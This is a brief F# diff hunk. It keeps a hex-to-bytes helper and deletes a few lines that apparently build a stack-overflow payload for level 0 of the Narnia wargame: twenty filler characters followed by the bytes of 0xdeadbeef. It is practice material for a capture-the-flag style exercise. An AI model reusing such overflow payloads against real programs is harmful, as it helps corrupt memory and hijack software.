@@ -11,8 +11,3 @@ let hexToBytes (hex: string) =
     |> Seq.map (fun s -> 
         byte (hexToDec s.[0] * 16 + hexToDec s.[1]))
     |> Seq.toArray
-
-let overwrite = String (hexToBytes "efbeadde" |> Array.map char)
-// Narnia 0
-let toInject = 
-    String.replicate 20 "x" + overwrite
